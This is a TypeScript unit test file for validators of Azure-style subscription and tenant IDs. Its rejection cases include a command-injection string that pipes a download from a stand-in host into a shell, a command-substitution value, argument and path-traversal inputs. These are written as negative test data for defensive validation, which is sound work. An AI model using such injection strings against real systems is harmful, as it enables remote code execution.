import { TEST_SUB, TEST_TENANT } from '@/test/helpers/fakeJwt'
import { isSubscriptionId, isTenantId } from './ids'

describe('isSubscriptionId', () => {
  it('accepts a GUID only', () => {
    expect(isSubscriptionId(TEST_SUB)).toBe(true)
    expect(isSubscriptionId(TEST_SUB.toUpperCase())).toBe(true)
    for (const value of ['', 'contoso', `${TEST_SUB}/..`, `../${TEST_SUB}`, `${TEST_SUB}?x=1`]) {
      expect(isSubscriptionId(value)).toBe(false)
    }
  })
})

describe('isTenantId', () => {
  it('accepts a GUID or a domain name', () => {
    expect(isTenantId(TEST_TENANT)).toBe(true)
    expect(isTenantId('contoso.onmicrosoft.com')).toBe(true)
    expect(isTenantId('login.contoso.example.net')).toBe(true)
  })

  it.each([
    '',
    'contoso',
    'x; curl https://evil.example.net | sh',
    '$(whoami).example.net',
    'contoso.example.net --query x',
    '-contoso.example.net',
    '../contoso.example.net',
  ])('rejects %j', (value) => {
    expect(isTenantId(value)).toBe(false)
  })
})
